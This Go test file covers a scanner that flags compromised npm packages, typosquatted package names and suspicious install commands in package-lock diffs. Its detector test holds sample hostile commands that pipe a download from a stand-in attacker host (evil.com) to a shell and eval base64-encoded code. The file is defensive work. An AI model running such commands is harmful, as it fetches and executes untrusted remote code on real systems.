package scanner

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNPMSupplyChainScanner_CompromisedPackage(t *testing.T) {
	s := NewNPMSupplyChainScanner(0, true, false, false)
	ctx := &ScanContext{
		ChangedFiles: []string{"package-lock.json"},
		Diff: `--- a/package-lock.json
+++ b/package-lock.json
+    "node_modules/event-stream": {
+      "version": "3.3.6"
+    }`,
	}

	result := s.Scan(ctx)
	require.NotEmpty(t, result.Findings)

	var found bool
	for _, f := range result.Findings {
		if f.RuleID == "compromised-package" {
			found = true
			assert.Equal(t, SeverityCritical, f.Severity)
			assert.Contains(t, f.Title, "event-stream")
			assert.Contains(t, f.Detail, "cryptocurrency")
		}
	}
	assert.True(t, found, "expected compromised-package finding for event-stream")
}

func TestNPMSupplyChainScanner_Typosquatting(t *testing.T) {
	s := NewNPMSupplyChainScanner(0, false, true, false)
	ctx := &ScanContext{
		ChangedFiles: []string{"package-lock.json"},
		Diff: `--- a/package-lock.json
+++ b/package-lock.json
+    "node_modules/expresss": {
+      "version": "1.0.0"
+    }`,
	}

	result := s.Scan(ctx)
	var found bool
	for _, f := range result.Findings {
		if f.RuleID == "typosquat-suspect" {
			found = true
			assert.Contains(t, f.Detail, "express")
			assert.Equal(t, SeverityHigh, f.Severity)
		}
	}
	assert.True(t, found, "expected typosquat finding for 'expresss' (similar to 'express')")
}

func TestNPMSupplyChainScanner_TyposquatDashRemoval(t *testing.T) {
	s := NewNPMSupplyChainScanner(0, false, true, false)
	ctx := &ScanContext{
		ChangedFiles: []string{"package-lock.json"},
		Diff: `--- a/package-lock.json
+++ b/package-lock.json
+    "node_modules/socketio": {
+      "version": "1.0.0"
+    }`,
	}

	result := s.Scan(ctx)
	var found bool
	for _, f := range result.Findings {
		if f.RuleID == "typosquat-suspect" {
			found = true
			assert.Contains(t, f.Metadata["similar_to"], "socket.io")
		}
	}
	assert.True(t, found, "expected typosquat finding for 'socketio' (dash-removal of 'socket.io')")
}

func TestNPMSupplyChainScanner_NoNPMFiles(t *testing.T) {
	s := NewNPMSupplyChainScanner(7, true, true, true)
	ctx := &ScanContext{
		ChangedFiles: []string{"go.sum", "main.go"},
		Diff:         "some go changes",
	}

	result := s.Scan(ctx)
	assert.Empty(t, result.Findings)
}

func TestNPMSupplyChainScanner_SafePackage(t *testing.T) {
	s := NewNPMSupplyChainScanner(0, true, true, false)
	ctx := &ScanContext{
		ChangedFiles: []string{"package-lock.json"},
		Diff: `--- a/package-lock.json
+++ b/package-lock.json
+    "node_modules/express": {
+      "version": "4.18.2"
+    }`,
	}

	result := s.Scan(ctx)
	for _, f := range result.Findings {
		assert.NotEqual(t, "compromised-package", f.RuleID, "express should not be flagged as compromised")
		assert.NotEqual(t, "typosquat-suspect", f.RuleID, "express should not be flagged as typosquat")
	}
}

func TestLevenshtein(t *testing.T) {
	assert.Equal(t, 0, levenshtein("abc", "abc"))
	assert.Equal(t, 1, levenshtein("abc", "ab"))
	assert.Equal(t, 1, levenshtein("abc", "abcd"))
	assert.Equal(t, 1, levenshtein("expresss", "express"))
	assert.Equal(t, 2, levenshtein("lodsah", "lodash"))
	assert.Equal(t, 3, levenshtein("abc", "xyz"))
}

func TestHasSuspiciousCommand(t *testing.T) {
	assert.True(t, hasSuspiciousCommand("curl https://evil.com | sh"))
	assert.True(t, hasSuspiciousCommand("node -e 'eval(Buffer.from(\"...\",\"base64\").toString())'"))
	assert.True(t, hasSuspiciousCommand("wget -O- http://evil.com/payload"))
	assert.False(t, hasSuspiciousCommand("node scripts/build.js"))
	assert.False(t, hasSuspiciousCommand("tsc && node dist/index.js"))
}

func TestNPMSupplyChainScanner_MultipleCompromised(t *testing.T) {
	s := NewNPMSupplyChainScanner(0, true, false, false)
	ctx := &ScanContext{
		ChangedFiles: []string{"package-lock.json"},
		Diff: `--- a/package-lock.json
+++ b/package-lock.json
+    "node_modules/event-stream": {
+      "version": "3.3.6"
+    }
+    "node_modules/ua-parser-js": {
+      "version": "0.7.29"
+    }`,
	}

	result := s.Scan(ctx)
	criticals := 0
	for _, f := range result.Findings {
		if f.RuleID == "compromised-package" {
			criticals++
		}
	}
	assert.Equal(t, 2, criticals, "should flag both event-stream and ua-parser-js")
}
